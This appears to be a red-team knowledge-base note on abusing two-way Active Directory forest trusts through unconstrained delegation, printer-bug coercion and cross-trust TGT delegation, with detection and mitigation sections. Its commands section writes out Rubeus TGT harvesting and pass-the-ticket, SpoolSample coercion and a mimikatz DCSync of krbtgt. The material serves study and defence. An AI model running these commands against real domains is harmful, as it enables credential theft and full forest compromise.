---
title: Forest Trust Abuse
aliases: ["Breaking Forest Trusts", "Cross-Forest Compromise", "Interforest Trust Abuse", "Unconstrained Delegation Across Forest Trusts"]
type: technique
domain: [active-directory, red-team]
attack_tactic: [lateral-movement, privesc, credential-access]
tags: [type/technique, domain/active-directory, domain/red-team, attack/lateral-movement, attack/privesc, attack/credential-access, proto/kerberos]
source:
  - "[[Source - harmj0y blog]]"
source_url: "https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/"
verified: true
related: ["[[Unconstrained Delegation]]", "[[Domain and Forest Trusts]]", "[[Trust Direction and Transitivity]]", "[[Forest]]", "[[Inter-realm TGT]]", "[[DCSync]]", "[[Kerberos Delegation]]", "[[Rubeus]]", "[[Computer Accounts]]", "[[SID History Abuse]]", "[[Pass-the-Ticket]]", "[[Golden Ticket]]"]
created: 2026-06-07
updated: 2026-06-07
---

# Forest Trust Abuse

> [!summary] One-liner
> By chaining **unconstrained delegation** on a domain controller, the **MS-RPRN "printer bug"** forced-authentication primitive, and the default forwarding of **Kerberos TGT delegation across two-way forest trusts**, an attacker who owns one forest can capture a foreign forest DC's TGT and compromise the trusting forest — proving the forest is **not** a hard security boundary.

## Concept abused
Microsoft has long documented the **[[Forest]]** as the Active Directory security boundary. harmj0y's research ("Not A Security Boundary: Breaking Forest Trusts") demonstrates this is not strictly true for **two-way interforest trusts**, because four default AD behaviors combine into a forest-crossing attack:

1. **Default DC unconstrained delegation** — Domain controllers are configured for **[[Unconstrained Delegation]]** by default. Any account that authenticates to such a host has its **TGT embedded inside the service ticket** and cached, unless the account is marked *"Account is sensitive and cannot be delegated"* (`NOT_DELEGATED`) or is in the **Protected Users** group.
2. **Kerberos full (TGT) delegation flows across the trust by default** — For a two-way forest trust, a user's forwardable TGT is delegated to a trusted unconstrained server even when that server is **in a foreign forest**. This is the linchpin: the foreign DC's TGT crosses the trust.
3. **MS-RPRN "printer bug" forced authentication** — The `RpcRemoteFindFirstPrinterChangeNotification` RPC (Print System Remote Protocol / Spooler service) lets any authenticated principal coerce a target machine to authenticate (Kerberos/NTLM) to an attacker-chosen host.
4. **Authenticated Users suffices across the trust** — Because a two-way trust makes a trusted forest's users "Authenticated Users" on foreign machines, *any user in a trusted forest can trigger the printer bug against machines in the other forest*.

Together these let you stand up an unconstrained-delegation host (you already control its DC) and **coerce a foreign forest's DC** to authenticate to it — handing you that DC's TGT.

## Prerequisites
- **Full control of one forest** (specifically a DC/unconstrained-delegation host in your forest, e.g. `DCB.FORESTB`). You are the attacker forest admin.
- A **two-way (bidirectional) interforest trust** between your forest and the target forest. *(One-way trusts where you are the trusted side failed in testing — see below.)*
- The trust must allow **Kerberos** (the attack is Kerberos-based; **external trusts** that fall back to **NTLM** do not work).
- **Kerberos TGT delegation enabled** on the trust (the default; `TRUST_ATTRIBUTE_CROSS_ORGANIZATION_NO_TGT_DELEGATION` not set).
- The target forest DC must run a **forced-authentication primitive** (Spooler / printer bug, or any equivalent coercion).

## How the attack works
Scenario: `FORESTA` and `FORESTB` have a **two-way** forest trust. The attacker owns `FORESTB` (including DC `DCB`). Goal: compromise `FORESTA`.

1. **Use an unconstrained-delegation host in your forest.** A domain controller (`DCB`) already qualifies. Begin monitoring for incoming TGTs — extract them from LSA as they arrive (`Rubeus monitor`).
2. **Coerce the foreign DC.** From your foothold, trigger the **printer bug** against the target forest's DC (`DCA.FORESTA`) pointing it at your unconstrained host (`DCB`). Because Authenticated Users from the trusted forest can call the RPC, this works across the two-way trust (Lee Christensen's **SpoolSample** PoC).
3. **Foreign DC authenticates to your host.** `DCA` connects back using its **machine account** (`DCA$`). Because the trust delegates TGTs and your host is unconstrained, the **foreign DC's TGT is forwarded and cached** in the service ticket on `DCB`.
4. **Harvest and reuse the TGT.** Extract `DCA$`'s TGT from LSA and apply it to your logon session (Pass-the-Ticket via `Rubeus`).
5. **DCSync the foreign forest.** With the foreign DC machine account's TGT, run **[[DCSync]]** against `FORESTA` to pull the `krbtgt` (and any) hashes → full compromise of the trusting forest (then forge a **[[Golden Ticket]]** for persistence).

> [!note] Direction matters
> The attack succeeded over **two-way** interforest trusts (bidirectional compromise possible). A **one-way** trust (FORESTB trusted by FORESTA only) failed in testing: the printer bug could not be triggered because the foreign DC had no reciprocal way to authenticate back. **ESAE / Red Forest** designs (production forests trust the admin forest one-way) are safe *unless* a two-way trust exists.

## Commands & tools
Harvest delegated TGTs as they arrive on the unconstrained host (`DCB`):
```powershell
# Rubeus: continuously monitor LSA for new TGTs (4624 logon events)
Rubeus.exe monitor /interval:5 /nowrap
```

Coerce the foreign forest DC to authenticate to your unconstrained host (printer bug):
```powershell
# SpoolSample (Lee Christensen) -- <CAPTURE_SERVER> = your unconstrained host (DCB)
SpoolSample.exe <TARGET_DC_FORESTA> <CAPTURE_SERVER_DCB>
```

Scan for Spooler reachability before coercing (Vincent Le Toux):
```powershell
SpoolerScanner / Get-SpoolStatus -ComputerName <TARGET_DC_FORESTA>
```

Apply the captured foreign DC TGT to the current session, then DCSync:
```powershell
# Pass-the-Ticket the harvested DCA$ TGT (base64 blob from Rubeus monitor output)
Rubeus.exe ptt /ticket:<BASE64_TGT_BLOB>

# DCSync the foreign forest root for krbtgt (mimikatz)
lsadump::dcsync /domain:foresta.local /dc:DCA.foresta.local /user:foresta\krbtgt
```

## Detection / artifacts
- **4624 logon events containing forwardable TGTs** on unconstrained-delegation hosts (esp. unexpected **foreign-forest machine accounts** such as `DCA$` logging on to `DCB`).
- **Cross-forest Kerberos service tickets carrying delegated TGTs.**
- **Spooler / MS-RPRN RPC activity** (`RpcRemoteFindFirstPrinterChangeNotification`) from one DC to another, especially across a trust.
- Anomalous **DCSync** replication (`DRSGetNCChanges`) sourced from a non-DC or via an injected ticket.
- harmj0y points to teammate **Roberto Rodriguez's** defensive write-up *"Hunting in Active Directory: Unconstrained Delegation & Forests Trusts"* for full detection guidance.

## Mitigation
**Effective:**
- **Disable Kerberos TGT delegation on the trust** (Windows Server 2012+). Sets `TRUST_ATTRIBUTE_CROSS_ORGANIZATION_NO_TGT_DELEGATION` on the trust's TDO so delegated TGTs no longer cross the trust:
  ```
  netdom trust foresta.local /domain:forestb.local /EnableTGTDelegation:no
  ```
- **Selective Authentication** on the trust — restricts which trusted-forest principals can authenticate to which resources. *Caveat:* DCs often still need *"Allowed to authenticate"*, which can re-open the path.

**Partial / defense-in-depth:**
- **Protected Users** group membership or **"Account is sensitive and cannot be delegated"** (`NOT_DELEGATED`) on sensitive machine accounts — prevents their TGTs from being delegated.
- **Disable the Print Spooler** service on DCs (mitigates the printer bug specifically; other forced-auth primitives still exist).
- **Avoid unconstrained delegation** on internet/trust-facing hosts; prefer **[[Constrained Delegation]]** / **[[Resource-Based Constrained Delegation (RBCD)]]**.

> [!warning] Vendor stance
> MSRC (Case 48161, Oct 2018) classified this as a **"v.Next"** design change rather than an immediate security patch — i.e. mitigations are configuration-based, not a CVE fix.

## Related
- Built directly on [[Unconstrained Delegation]] + a forced-auth primitive (printer bug); the captured TGT is used via [[Pass-the-Ticket]] then [[DCSync]] → [[Golden Ticket]].
- Trust mechanics: [[Domain and Forest Trusts]], [[Trust Direction and Transitivity]], [[Inter-realm TGT]], [[Forest]].
- Contrast with **intra-forest** cross-domain escalation via [[SID History Abuse]] (ExtraSids), which exploits the lack of SID filtering *inside* a forest rather than delegation across forests.
- Tooling: [[Rubeus]] (monitor/ptt), [[Computer Accounts]] (the abused `DCA$` principal).

## Sources
- [[Source - harmj0y blog]] — "Not A Security Boundary: Breaking Forest Trusts" — https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/
